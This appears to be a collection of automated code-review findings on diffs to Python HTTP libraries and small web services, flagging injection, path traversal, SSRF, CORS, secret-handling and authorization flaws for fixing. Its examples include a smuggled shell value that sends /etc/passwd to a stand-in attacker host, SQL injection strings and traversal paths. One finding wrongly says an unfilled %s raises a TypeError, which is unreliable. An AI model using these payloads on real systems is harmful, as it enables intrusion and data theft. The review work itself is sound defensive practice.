Absolute resolution means the `adapters` module that ends up handling *every* outbound request for every consumer of this library is whatever `sys.path` happens to resolve first — the invoking script's directory, the current working directory under `python -c`/REPL, or any earlier-listed site directory. Anyone who can write a file named `adapters.py` next to an application's entry script gets `HTTPAdapter.send()` called with fully prepared requests, including Authorization headers and cookies, and controls the responses handed back. It is also simply broken on Python 3 and for any consumer that has its own `adapters` module. Change to `from .adapters import HTTPAdapter`.

_Also raised by the docs agent:_ Relative import will fail at runtime

findings.title: Stale docstring for close() method no longer describes implementation
findings.body: The `close()` method (line 131–132) now contains only `pass`, but the removed docstring (lines 131–137 in the original) promised that it would 'close the PoolManager, which closes pooled connections.' A caller reading or remembering the old documentation would expect resource cleanup on `close()`, but the method now does nothing. This is a breaking change in contract that the documentation must reflect.

findings.title: New `request()` drops session state and most of its own arguments
findings.body:
The rewritten `request()` builds a bare `Request()` from only the call-site arguments and then calls `self.send(prep)`. Two classes of data are silently lost:

- Session-level state that the old implementation merged in (`self.headers`, `self.cookies`, `self.auth`, `self.params`, `self.verify`, `self.config`) is never applied, so a configured `Session` behaves like a fresh one — session auth and cookies stop being sent.
- The accepted keyword arguments `timeout`, `verify`, `cert`, `prefetch`, `config` and `return_response` are accepted and then never read, so `session.get(url, timeout=5)` silently blocks forever instead of timing out, and `verify=False`/`cert=...` silently change nothing.

Silently ignoring `timeout` and `verify` is worse than raising: callers relying on them get no signal. Either thread them through to `send()`/the adapter or raise `NotImplementedError` while the refactor is in flight.

findings.title: `_send_request` deleted but `old_request` still calls it
findings.body: The `_send_request` helper was removed in this diff, yet the surviving `old_request` body still ends with `return self._send_request(r, **args)`. Any code path that reaches `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep the helper until `old_request` is deleted, or delete `old_request` in the same change.

findings.title: `close()` is now a no-op and `self.poolmanager` no longer exists
findings.body:
`init_poolmanager()` and its call in `__init__` were removed, so `self.poolmanager` is never set, and `close()` was reduced to `pass`. Consequences:

- `with Session() as s:` / explicit `s.close()` no longer release pooled sockets — connections leak for the lifetime of the process.
- Any caller (or other module in this package) touching `session.poolmanager` or calling `session.init_poolmanager()` now gets `AttributeError`; both were public-looking attributes of `Session`.
- The `PoolManager` import on line 19 is now dead.

The adapter presumably owns the pool now, but `close()` needs to delegate to it rather than becoming a silent no-op.

findings.title: `send()` constructs a new HTTPAdapter per request, defeating pooling
findings.body: `send()` instantiates `HTTPAdapter()` on every call. Since the adapter owns the connection pool that `Session` used to hold, a fresh adapter per request means a fresh pool per request: no connection reuse, and each discarded adapter's sockets are left to garbage collection. This is the exact behaviour `init_poolmanager` existed to prevent. The adapter should be created once (in `__init__`, ideally mounted per-prefix) and reused.

findings.title: Untested behavior change: close() no longer closes the poolmanager
findings.body: close() previously called self.poolmanager.clear() to release pooled connections; it now does nothing (`pass`). This is a real behavior regression (connections/resources will leak) and nothing in the diff exercises close() to detect that it stopped doing its job.

findings.title: New request() silently drops verify/cert/timeout before sending
findings.body: The rewritten `request()` still accepts `verify`, `cert` and `timeout` in its signature (lines 141, 148-149) but never assigns them to `req` and never passes them to `self.send(prep)` (line 167). `send()` then builds a bare `HTTPAdapter()` with no configuration (line 365). The result is that a caller who explicitly requests certificate verification or pins a CA bundle (`session.get(url, verify='/etc/ca.pem')`) or supplies a client certificate gets that argument accepted and silently discarded — the connection is made with whatever the adapter's unconfigured default is. A silently-ignored TLS parameter is worse than an error, because the caller has no signal that the control they asked for is not in effect. Either thread `verify`/`cert`/`timeout` through to the adapter, or raise `NotImplementedError` for them while the refactor is in flight. Dropping `timeout` also means every request can now block indefinitely, which is an availability concern against a slow or hostile server.

findings.title: cookies property returns None on parse failure, breaking callers
findings.body:
When `SimpleCookie.load()` raises (any malformed `Cookie:` header sent by a client), the new property assigns `self._cookies = None` and returns it. The previous implementation in `RequestHandler.cookies` called `self.clear_all_cookies()`, which left `self._cookies` as the empty `SimpleCookie` created two lines earlier, so the property always returned a dict-like object.

The callers left in web.py still assume that contract:
- `get_cookie` (line 321) does `if name in self.request.cookies` → `TypeError: argument of type 'NoneType' is not iterable`.
- `clear_all_cookies` (line 367) does `self.request.cookies.iterkeys()` → `AttributeError: 'NoneType' object has no attribute 'iterkeys'`.

So any request carrying a Cookie header that `Cookie.SimpleCookie` cannot parse turns into an unhandled 500 for any handler that reads a cookie (including XSRF/secure-cookie paths). Fix by resetting to an empty cookie jar in the except branch, e.g. `self._cookies = Cookie.SimpleCookie()`, preserving the old "empty, not None" behaviour. Note also that moving the property to `HTTPRequest` correctly drops the `clear_all_cookies()` side effect (the request object cannot emit Set-Cookie headers), so the only thing to restore is the empty-dict return value.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, breaking all callers

findings.title: Malformed-cookie exception path and its callers are untested
findings.body: The moved `cookies` property changed its exception-handling behavior from the original (`self.clear_all_cookies()`, leaving `_cookies` as an empty SimpleCookie) to setting `self._cookies = None` on a parse failure. This is a behavior change with downstream consequences: `web.py`'s `get_cookie` (line 321) and `clear_all_cookies` (line 367) now call `in self.request.cookies` and `self.request.cookies.iterkeys()` respectively, both of which will raise if `cookies` is `None`. No test in this change (or apparently in the surrounding suite, since none is touched) exercises a malformed `Cookie` header to catch this regression.

findings.title: Incomplete docstring for cookies property
findings.body: The docstring states 'A dictionary of Cookie.Morsel objects' but does not document that the property can return None if cookie parsing fails (line 523). Callers relying on this property will get a dict-like object in normal cases but None in error cases, which could cause AttributeError when accessing keys. The docstring should document this exceptional return value.

findings.title: Boundary parameter never matches: whitespace after ';' not stripped
findings.body:
`content_type.split(";")` yields the parameters with their leading space intact, e.g. `["multipart/form-data", " boundary=----WebKitFormBoundaryX"]`. `field.partition("=")` then gives `k == " boundary"`, so `k == "boundary"` is False for the normal, RFC-conformant header that every browser and HTTP client emits. The loop finishes without `break`, the `for ... else` branch fires, and every multipart/form-data request is rejected with `logging.warning("Invalid multipart/form-data")` and no files/fields parsed. The previous code (`if 'boundary=' in content_type`) was whitespace-insensitive, so this is a regression that disables file uploads entirely.

Fix: `k, sep, v = field.strip().partition("=")`. While there, consider stripping surrounding double quotes from `v`, since `boundary="..."` is legal and `_parse_mime_body` will not match the quoted delimiter.

findings.title: Boundary parameter name not stripped: standard multipart bodies never parsed
findings.body:
`content_type.split(";")` yields the parameters with their leading whitespace intact. For the canonical header a browser sends — `Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX` — the second element is `" boundary=----WebKitFormBoundaryX"`, so `field.partition("=")` gives `k == " boundary"` and the `k == "boundary"` test never fires. The loop completes without `break`, the `for ... else` runs, and every well-formed multipart request is logged as "Invalid multipart/form-data" and silently dropped: `self._request.arguments` and `files` stay empty while `self.request_callback(self._request)` still runs on line 368.

The old code (`'boundary=' in content_type`) was whitespace-insensitive, so this is a regression introduced by the hunk.

Fix: `k, sep, v = field.strip().partition("=")`. While there, RFC 2045 permits a quoted value (`boundary="..."`), which this code also passes through with the quotes attached to `_parse_mime_body`; strip surrounding quotes from `v` too.

Security relevance (why this is more than a functional bug): the handler is still invoked with an empty argument set, so application code that reads a POST field and treats "absent" as benign — `if self.get_argument('x', None) == ...`, optional-flag checks, audit fields — takes the absent branch for a request that any proxy, WAF or log pipeline in front of Tornado parses normally. That is a request-parsing differential an attacker can trigger with a completely ordinary request, and it is attacker-observable (they control the Content-Type header entirely).

findings.title: No test covers multipart boundary parsing with multiple Content-Type fields
findings.body: This change rewrites the logic for extracting the boundary from a Content-Type header that may contain multiple ';'-separated fields (e.g. 'multipart/form-data; charset=utf-8; boundary=xyz'). No test in the diff exercises this new branch. In particular, the known bug this introduced is that field values/keys are not stripped of surrounding whitespace after split(';'), so a header like 'multipart/form-data; boundary=xyz' (with a space after ';') produces k=' boundary' which never equals 'boundary', silently falling through and losing the boundary — yet nothing here would fail to alert on that regression since there is no test for either the multi-field case or the whitespace case.

findings.title: Error message has placeholder but no argument
findings.body: The LocationParseError on line 100 uses a format placeholder `%s` in the string, but no argument is provided to the raise statement. This means the error message will literally read 'Failed to parse: %s' rather than showing the actual URL that failed. Callers relying on this error message to diagnose parsing failures will get an unhelpful message. Add the `url` argument to the format string: `raise LocationParseError("Failed to parse: %s" % url)`

findings.title: Hand-rolled get_host disagrees with urlparse on query/fragment before '@'
findings.body:
`get_host` strips the scheme, then splits on `/`, then on `@`, then on `:`. It never accounts for `?` or `#`, which terminate the authority component in a real URL parser. For `http://google.com?@evil.com/path`, `urlparse`/browsers resolve the host as `google.com`, but this function splits on `/` (yielding `google.com?@evil.com`), then on `@`, and returns `evil.com` as the host it will connect to. Any caller that validates a user-supplied URL against an allowlist using `urlparse` and then hands the same URL to urllib3 will connect somewhere the check never approved — a straightforward SSRF/allowlist-bypass primitive. The same divergence applies to `#`.

Prefer delegating authority parsing to `urlsplit`/`urlparse` (splitting off query and fragment before the `@`/`:` handling at minimum), so that the host urllib3 dials matches the host a validator sees.

findings.title: LocationParseError message has an unfilled %s placeholder
findings.body:
`raise LocationParseError("Failed to parse: %s")` passes a format string with a `%s` conversion but never applies an argument, so callers and logs receive the literal text `Failed to parse: %s` with no indication of which URL failed. This is the only diagnostic a caller of `get_host` gets on a malformed authority, and it is useless for debugging. Fix by interpolating the offending value, e.g. `raise LocationParseError("Failed to parse: %s" % url)` (or the original url argument, which is more informative since `url` has been rebound by the splits above).

_Also raised by the security agent:_ LocationParseError message has an unfilled %s placeholder

findings.title: No test exercises the non-digit port branch of get_host
findings.body: get_host raises LocationParseError("Failed to parse: %s") when the port segment isn't all digits (line 100). This diff adds no tests at all, so this branch — including the exact error message produced — is completely unexercised. As it stands, the string still contains an unfilled '%s' placeholder, and nothing would catch a change (or existing defect) here since the branch is never invoked by any test.

findings.title: Public attribute type change breaks callers using documented API
findings.body:
The `location` attribute's type has changed from `str` to `URL`. Existing code that calls string methods on `self.location` (like `startswith()` or uses it in string contexts) will now fail with an AttributeError or TypeError. The documentation explicitly states application code relies on string operations here, making this a breaking change to the public contract.

_Also raised by the security agent:_ location changes from str to URL, breaking string-based redirect checks

_Also raised by the correctness agent:_ HTTPMove.location changes from str to URL, breaking callers

findings.title: HTTPMove.location now stores URL object, not string as documented
findings.body: The public attribute `HTTPMove.location` now stores a `URL` object (line 8: `self.location = URL(location)`), but the documentation in docs/web_reference.rst explicitly states it holds 'the string it was constructed with'. This breaks the documented contract that application code relies on for string comparisons (`str.startswith`) and passing to string operations. Callers following the documentation will receive a URL object instead and their code will break.

findings.title: No test guards self.location's documented string type
findings.body: self.location is now assigned URL(location) instead of the original string, contradicting the documented contract in docs/web_reference.rst that says 'the location ... as the string it was constructed with.' No test in this diff checks that HTTPMove.location remains a string equal to the input; if such a test existed, this change would have failed it. Add or restore a test asserting isinstance(exc.location, str) and exc.location == original_location_string.

findings.title: readany can return empty bytes on a spurious wakeup after while→if
findings.body:
`_wait` documents that the waiter is also resolved at the end of a chunk, which can happen with no new data in the buffer, so callers "must re-check its condition after waking rather than assuming data arrived." Replacing the `while` loop with a single `if` removes exactly that re-check: after `await self._wait('readany')` returns from such a wakeup, `self._buffer` is still empty and `self._eof` is still False, so `self._read_nowait(-1)` returns an empty `bytes` object on line 8. Callers of `readany()` conventionally treat an empty return as end-of-stream, so a chunk-boundary wakeup will silently truncate the stream. Restore the `while` loop so the buffer/EOF condition is re-evaluated after each wake.

_Also raised by the security agent:_ Single `if` lets readany() return b"" on a spurious wake, signalling false EOF

findings.title: No test guards against spurious-wakeup regression in readany()
findings.body: The change from `while not self._buffer and not self._eof` to `if not self._buffer and not self._eof` reintroduces the exact bug the docstring at the top of _wait() warns about: 'the waiter is also resolved at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived.' With `if`, a single wakeup with empty buffer and no eof will fall through to `_read_nowait(-1)` and return empty bytes prematurely instead of continuing to wait. There is no test in this PR (or apparently in the existing suite, since this diff was accepted) that exercises a wait-wakeup-with-no-data scenario for readany(), so this behavioral regression would not be caught by any test run.

findings.title: Implicit relative import breaks module import on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3 (PEP 328), so on any Python 3 interpreter this resolves against `sys.path` rather than the `requests` package and raises `ModuleNotFoundError: No module named 'adapters'` — or, worse, silently binds an unrelated top-level `adapters` module if one happens to be installed. Importing `requests.sessions` (and therefore `requests` itself) fails outright. Restore `from .adapters import HTTPAdapter`.

findings.title: Absolute `from adapters import` allows sys.path module shadowing
findings.body: Dropping the leading dot changes `HTTPAdapter` from being resolved inside the `requests` package to being resolved against `sys.path`. Under Python 2 with implicit relative imports it happens to still find the sibling module, but under Python 3 (and under Python 2 with `from __future__ import absolute_import`) it resolves to any top-level module named `adapters`. `sys.path[0]` is the directory of the entry script (or the current working directory for `-c`/interactive use), so anyone who can drop an `adapters.py` next to the application's entry point, or into any earlier `sys.path` entry such as a writable shared directory, gets their code executed inside the HTTP client that every request flows through — a direct path to intercepting or rewriting outbound traffic and credentials. Restore `from .adapters import HTTPAdapter` so the module is bound to the package and cannot be shadowed.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body: `HTTPRequest.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed, and the property's own docstring says "every consumer has to allow for that". After this change, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`, and line 4 would fail the same way. Any request with a malformed Cookie header that reaches a handler calling `get_cookie` (including anything built on `get_secure_cookie`/XSRF handling) will 500 instead of falling through to `return default`. Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:`.

findings.title: get_cookie may crash on malformed Cookie header
findings.body: The `request.cookies` property is documented in httpserver.py as returning None when the Cookie header is present but cannot be parsed. The removal of the `is not None` check means `get_cookie()` will now raise a TypeError when attempting the `in` check on None, rather than gracefully returning the default value. Either restore the None check or update the documentation for `request.cookies` to guarantee it is never None.

findings.title: Malformed Cookie header from any client raises TypeError in get_cookie
findings.body:
`HTTPRequest.cookies` is documented (and implemented) to return `None` when the Cookie header is present but cannot be parsed, precisely so "every consumer has to allow for that". Removing the `is not None` check means `name in self.request.cookies` evaluates `name in None`, raising `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie:` request header, fully attacker-controlled and requiring no authentication. Sink: the membership test on line 3, reached from every handler that calls `get_cookie` (including `get_secure_cookie` / XSRF and session paths). The result is an unhandled exception and a 500 for any request carrying a deliberately malformed cookie — a trivial remote availability/error-path issue, and it turns a benign parse failure into a server error rather than a missing-cookie fallback.

Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:` — or, if the intent is to simplify, change `cookies` to return an empty dict instead of `None` and update all consumers.

findings.title: No test exercises get_cookie with cookies=None
findings.body: The change removes the `self.request.cookies is not None` guard in get_cookie, reintroducing a TypeError ('argument of type NoneType is not iterable') whenever request.cookies is None (which the cookies property docstring says happens when the Cookie header is present but unparsable). This diff includes no test that sets request.cookies to None and calls get_cookie, so a regression here would pass CI silently.

findings.title: Dropping .strip() makes boundary parameter never match
findings.body: `content_type.split(";")` yields parameter segments that retain the leading whitespace from the conventional `type; param=value` header form, e.g. `" boundary=----WebKitFormBoundaryX"`. Without `.strip()`, `field.partition("=")` produces `k == " boundary"`, so the `k == "boundary"` test on line 5 is false and `_parse_mime_body` is never called. The loop then completes with no match and the multipart body is silently discarded — form fields and uploaded files disappear with no error raised to the handler. Restore `field.strip().partition("=")` (and ideally strip `v` as well for headers written with spaces around `=`).

findings.title: Dropping .strip() lets the client decide if the multipart body is parsed
findings.body:
`fields = content_type.split(";")` yields elements with the leading space intact for the standard header form `multipart/form-data; boundary=----abc`. Without `.strip()`, `field.partition("=")` returns `k == " boundary"`, the `k == "boundary"` test on line 5 fails, `_parse_mime_body` on line 6 is never reached, and the body is discarded with no error.

Entry point: the attacker-supplied `Content-Type` request header. Sink: `self._parse_mime_body(v, data)`.

Two consequences:

1. Functional regression — well-formed multipart uploads silently yield empty `request.files` / `request.body_arguments`.
2. Parser differential — the *same* request parses or does not parse depending purely on whether the client emits a space after the semicolon (`;boundary=x` still matches). An upstream proxy, WAF or logging tier that normalises and inspects the multipart body will see fields that the Tornado application never sees, and application-side checks that key off body arguments ("reject if field X present", "require field Y") fail open for the whitespace variant. The same loss of `strip()` also leaves trailing whitespace/CR on `v`, corrupting the boundary token.

Restore the strip: `k, sep, v = field.strip().partition("=")`, and consider stripping `v` of surrounding quotes as well.

findings.title: No test exercises boundary parsing with whitespace-separated fields
findings.body: The change removes field.strip() before partitioning on '=' when parsing multipart/form-data content-type parameters. This means a header like 'multipart/form-data; boundary=XYZ' (with a space after the semicolon, which is extremely common) would now fail to match 'boundary' as the key, since k would be ' boundary' instead of 'boundary'. No test file is part of this diff, so this regression would not be caught by CI. A test that POSTs a multipart body with a standard 'Content-Type: multipart/form-data; boundary=...' header (i.e., with a space) and asserts the fields are parsed would catch this.

findings.title: No test appears to cover the LocationParseError message content
findings.body: The change breaks the error message by leaving a %s placeholder with no argument, which will raise a TypeError at runtime instead of LocationParseError when an invalid port is parsed. If a test asserted on the exception message or type produced by this code path, it should have caught this; since no test file is part of this diff, it's unclear such a test exists or was updated/broken by this change.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: The exception message is now the literal string `"Failed to parse: %s"` — the `% url` interpolation argument was removed, so the placeholder is never filled. Callers and logs will see a raw `%s` instead of the offending URL, which removes the only diagnostic information this error carried. Restore the argument: `raise LocationParseError("Failed to parse: %s" % url)`.

findings.title: Error message has unused format placeholder
findings.body: The error message contains a `%s` format placeholder but no format argument is provided. This will result in the literal string "Failed to parse: %s" being displayed to users instead of the actual URL that failed to parse. While the PR description suggests this is an intentional fix (removing the url from the message), the retained `%s` makes the message incomplete and potentially confusing.

findings.title: Command injection: shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a shell string and runs it with `shell=True`. Any shell metacharacter in either value (`;`, `&&`, `$( )`, backticks, newline) breaks out of the intended `tar` invocation and runs arbitrary commands as the service user, e.g. `name = "x; curl attacker/$(cat /etc/passwd) #"`.

Fix by dropping the shell and passing an argument list, as the existing `list_exports` on line 5 already does:

```python
def create_archive(name, directory):
    target = os.path.join("/exports", f"{name}.tar.gz")
    return subprocess.run(["tar", "-czf", target, directory], check=True)
```

Additionally validate `name` against a strict allowlist (e.g. `^[A-Za-z0-9_-]+$`) before use, since even without a shell a value like `../../etc/cron.d/x` lets the caller write the archive outside `/exports` (see the path-traversal note on line 9).

findings.title: Unquoted interpolation breaks for names/directories with spaces
findings.body:
`cmd` is built by f-string and executed with `shell=True`, so the shell word-splits on whitespace. A perfectly ordinary call like `create_archive("july backup", "/data/my files")` produces `tar -czf /exports/july backup.tar.gz /data/my files`, i.e. tar sees `/exports/july` as the archive name and three unintended operands — the command either fails or writes the wrong file. The same mechanism makes any shell metacharacter in `name` or `directory` (`;`, `|`, `$(...)`, backticks) change what actually runs.

Use the list form like the existing `list_exports` does, which needs no shell and no quoting: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`. If `name` comes from a user, also reject path separators so it cannot escape `/exports/`.

findings.title: No test coverage for create_archive's shell command construction
findings.body: create_archive builds a shell command string via f-string interpolation and runs it with shell=True. There is no test in this diff exercising this function, so nothing would catch a broken command, a change in quoting behaviour, or a regression that widens the injection surface further.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, in a file whose existing export deliberately restricts origins to `ALLOWED` (line 6). Any route that mounts this middleware no longer has an origin control at all: a page on an attacker-controlled domain can issue same-session requests and read the responses, turning any authenticated GET into a cross-origin data read and any state-changing endpoint into a CSRF sink that the attacker can also observe the result of.

Two notes on exploitability, since the exact behaviour depends on the middleware implementation that is not in this diff:
- If this is the standard `cors` package, it emits a literal `Access-Control-Allow-Origin: *`, and browsers refuse to attach credentials to such a response — so the endpoint may simply be broken for the dashboard rather than exploitable, which is a strong sign the configuration is not what the author intended.
- If the middleware (or a proxy/`Vary` layer in front of it) reflects the request `Origin` instead of emitting a literal `*`, the credentialed cross-origin read works and this is directly exploitable.

Either way the fix is the same: never combine a wildcard with credentials. Extend `ALLOWED` with the dashboard's own origin(s), or pass a function that echoes the request origin only when it is a member of that allowlist, and keep `credentials: true` only on that narrowed set.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`cors({ origin: "*", credentials: true })` emits a literal `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`. Per the Fetch spec, a user agent making a request with `credentials: include` (cookies, Authorization, or `withCredentials`) treats a wildcard ACAO as a failure and blocks the response — so this middleware does not actually open access for the dashboard, it makes every credentialed cross-origin call fail. Only non-credentialed requests will work, which defeats the `credentials: true` on line 12.

To get the evident intent, reflect the specific requesting origin after checking it against an allowlist (as the existing `ALLOWED` config on line 6 does) rather than using `"*"`, e.g. `origin: (o, cb) => cb(null, isDashboardOrigin(o) ? o : false)`, and keep `Vary: Origin` set. That also avoids the unbounded-origin exposure this otherwise grants.

findings.title: New wildcard+credentials CORS config has no test coverage
findings.body: The new `dashboardCors` export combines `origin: "*"` with `credentials: true`, a configuration that browsers actually reject at runtime (credentialed requests cannot use a wildcard origin) — meaning the export could be silently broken or misconfigured and nothing would catch it. There is no test exercising this exported middleware to confirm it produces the expected CORS headers/behavior.

findings.title: Live AcmePay secret key hardcoded in source
findings.body: `ACMEPAY_SECRET_KEY` is a literal `acme_live_...` value committed to the repository, and `client()` now assigns it directly to `acmepay.api_key` instead of reading `os.environ["ACMEPAY_SECRET_KEY"]`. The `acme_live_` prefix indicates a production credential, so anyone with read access to the repo — including clones, CI logs, forks and any future mirror — holds a working payments credential. Revoke and rotate this key with the provider immediately (committed secrets must be treated as compromised even if the commit is later amended, since it exists in history and in any pulled copy), then restore the environment-variable lookup or move it into the project's secret manager. Consider adding a secret-scanning pre-commit hook to prevent recurrence.

findings.title: Env-based key replaced by fixed literal removes per-environment config
findings.body: `client()` previously read `os.environ["ACMEPAY_SECRET_KEY"]`, so each environment supplied its own key and a missing key failed loudly with a `KeyError` at call time. After this change the key is a module constant bound at import, so: (1) dev, CI and staging all authenticate against the *live* account implied by the `acme_live_` prefix, meaning test runs execute real charges; (2) rotating the key requires a code change and redeploy rather than a config update; (3) the previous fail-fast behaviour on missing configuration is gone — misconfiguration now silently succeeds against production. Restore the environment lookup (optionally with an explicit error message if unset) and keep the value out of source.

findings.title: No test covers client() no longer reading from environment
findings.body: client() previously set acmepay.api_key from os.environ['ACMEPAY_SECRET_KEY']; it now uses a hardcoded module-level constant instead. This is a behavior change (any deployment relying on environment-based configuration silently stops working) but nothing in the diff tests client()'s output or exercises this code path — tests/fixtures/acmepay.py only defines a fixture (fake_client/TEST_KEY) with no assertions. If this change were wrong (e.g. an incomplete revert or wrong constant), nothing would fail.

findings.title: tenant_of trusts an unverified token's tenant_id claim
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the returned `tenant_id` comes from a payload nobody has authenticated. Anyone can base64-encode a JWT body with an arbitrary `tenant_id` and the function will return it — any caller using this value to scope queries or authorisation decisions will operate on the wrong tenant. The sibling `claims_for` on line 7 already verifies with `public_key()` and RS256; `tenant_of` should reuse it (`return claims_for(token)["tenant_id"]`) rather than introduce a second, unverified decode path. If the intent was to avoid a key lookup, cache `public_key()` instead of skipping verification.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: Public function lacks documentation of unverified JWT behavior
findings.body: The new `tenant_of` function decodes a JWT without signature verification. A caller could easily misuse this by assuming the token content is verified, leading to security issues if the tenant_id is trusted downstream. The function needs a docstring explicitly warning that it returns unverified claims and should only be used in contexts where the token signature has already been verified or the unverified tenant_id is safe to act upon.

findings.title: No test coverage for unverified tenant_id extraction
findings.body: tenant_of() trusts unverified JWT claims to extract tenant_id, a security-sensitive behavior change. No test file accompanies this diff, so there is nothing to catch a regression (e.g., a future accidental re-enabling of verification breaking multi-tenant callers, or a malformed/missing 'tenant_id' claim raising an unhandled KeyError). Since this is new logic with no existing test in the same area shown, add at least a test asserting tenant_of returns the expected tenant_id from an unsigned/forged token and one covering the missing-claim error path.

findings.title: Missing tenant_id claim raises KeyError instead of a handled error
findings.body: `unverified["tenant_id"]` assumes the claim is always present. A token issued without `tenant_id` (or one crafted by a caller, since nothing is verified) makes this raise a bare `KeyError`, which callers of an auth helper are unlikely to be catching and which will surface as a 500 rather than an authentication failure. Use `.get("tenant_id")` with an explicit check, or raise the module's/library's auth error type.

findings.title: Missing ownership check lets any user modify others' payment methods
findings.body:
`update_payment_method` resolves `pm_id` (attacker-controlled, it comes from the request path/args) directly via `PaymentMethod.get(pm_id)` and then writes `pm.billing_name` and calls `pm.save()` without ever authorising the caller against that object. It even computes `user = current_user(request)` on line 11 and then never uses it, which strongly suggests the `require_owner(user, pm)` call was simply forgotten.

The read handler immediately above does this correctly (line 6: `require_owner(current_user(request), pm)`), and `api/auth.py` documents that `current_user` is "Authentication only — never authorisation" and that "Every object mutation must call" `require_owner`.

Fix: insert `require_owner(user, pm)` immediately after line 12, before any field assignment.

Impact: any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on other users' saved payment methods — a cross-tenant data integrity violation, and potentially a stepping stone for fraud/social engineering on the payment record.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ body["billing_name"] raises KeyError when the field is absent

findings.title: No test covers update_payment_method, including missing authz check
findings.body: update_payment_method loads a PaymentMethod by id and mutates/saves it without calling require_owner(user, pm), unlike the adjacent get handler which does call it. There is no test in this diff exercising this new function, so a test that verifies a user cannot update another user's payment method (which would fail today) does not exist, and nothing would catch this regression if it were introduced or persists.

findings.title: Public API missing documented authorization contract
findings.body: The function `update_payment_method` mutates a payment method object without calling `require_owner()`. The repository convention explicitly states: "Every object mutation must call this" (referring to `require_owner`). This is a public API endpoint that accepts a user-controlled `pm_id` and applies mutations without verifying ownership, violating the documented contract that governs all object mutations in this codebase.

findings.title: Rate limit removed from password reset endpoint
findings.body: `request_reset` was previously protected by `@rate_limit("5/hour")`; the decorator and its `from limits import rate_limit` import are both deleted, so the handler now accepts unlimited requests. The attacker-controlled input is the `email` parameter, which flows directly into `send_reset_email(email)` on line 2 with no throttling in between. Consequences: (a) unbounded reset-email flooding of any known address — a mail-bombing / harassment vector that also burns outbound mail quota and reputation; (b) cheap account-enumeration if reset responses or timing differ for known vs unknown addresses; (c) far more reset tokens minted per account, widening the window for token guessing or interception. Restore the decorator, or move equivalent throttling (per-IP and per-email) into middleware if the limiter is being centralised — the diff shows no replacement.

findings.title: No test guards rate limiting on request_reset
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`. There is no test file in this diff, so if a test previously verified that repeated calls to this endpoint were throttled, it does not appear here, and if no such test exists at all, this regression (or a future reintroduction of the bug) would go undetected. A test that asserts repeated requests beyond the limit are rejected (e.g. checking a 429/blocked response after N calls) would catch this class of regression.

findings.title: read_export_preview skips _confined(), allowing path traversal
findings.body:
`read_export_preview` joins the caller-supplied `name` directly onto `EXPORT_ROOT`. `os.path.join` does not confine: a `name` of `../../etc/passwd` resolves outside the export root, and an absolute `name` such as `/etc/passwd` discards `EXPORT_ROOT` entirely, so the open reads an arbitrary file (up to `limit` bytes). The function immediately above it on line 14 already routes through `_confined(name)` for exactly this reason, so the fix is to do the same here: `path = _confined(name)`. If `_confined` raises on rejection, make sure the caller of the preview endpoint maps that to a 400/404 rather than a 500.

_Also raised by the security agent:_ Path traversal: read_export_preview skips _confined()

findings.title: Public function lacks documented path safety contract
findings.body: The new `read_export_preview` function accepts a `name` parameter with no docstring explaining whether it is safe to pass user input. The function calls `os.path.join(EXPORT_ROOT, name)` without the `_confined()` normalization and containment check that the adjacent `read_export` function uses (line 14). A caller who sees `read_export_preview` next to `read_export` in the same module could reasonably assume both confine the path, and pass untrusted input to either. This is a contract violation that must be documented at the function definition: either add a docstring stating the input must be pre-validated, or apply the same confinement as `read_export`.

findings.title: New unconfined path-join function has no test coverage
findings.body: read_export_preview builds a path via os.path.join(EXPORT_ROOT, name) without the _confined() normalisation used by the neighboring handler. Nothing in this diff (or apparently elsewhere) tests that a name like '../../etc/passwd' is rejected or confined, so a regression or the current unsafe behavior would pass silently.

findings.title: bulk_export no longer enforces tenant ownership on fetched reports
findings.body:
`bulk_export` fetches every `Report` named in the caller-supplied `report_ids` and serialises it straight back, with the `require_owner(user, report)` loop and its import deleted. `report_ids` is fully attacker-controlled, so any authenticated user can enumerate IDs and read another tenant's report bodies. `require_owner` is documented as mandatory for every cross-tenant read (api/auth.py:1-5), and nothing else in this function performs the `obj.tenant_id != user.tenant_id` comparison — `Report.get(rid)` is a bare primary-key lookup with no tenant scoping. If the goal is to avoid N checks, restore the guarantee at the query level, e.g. fetch with `Report.where(id__in=report_ids, tenant_id=user.tenant_id)` and reject (or omit) any requested ID that does not come back, rather than dropping the check entirely.

_Also raised by the security agent:_ Ownership check removed from bulk_export — cross-tenant data read

findings.title: No test guards cross-tenant access in bulk_export
findings.body: The diff removes the require_owner authorization check from bulk_export, but no test file is part of this change. If a test previously verified that bulk_export raises Forbidden for reports owned by another tenant, it would now need to fail — but no such test is shown as updated or added, meaning this regression could merge without any red test signaling the loss of the authz control.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` builds its statement with an f-string, placing `term` and `status` unescaped inside single-quoted SQL literals, then passes the finished string to `execute(sql)` with no params. Any caller value containing a quote breaks out of the literal: e.g. `status="x' OR '1'='1"` returns every customer row, and `term="%'; DROP TABLE customers; --"` reaches the driver as statement text.

Use the same parameterisation as `get_customer` on line 5, and build the LIKE wildcards in Python rather than in the SQL text:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
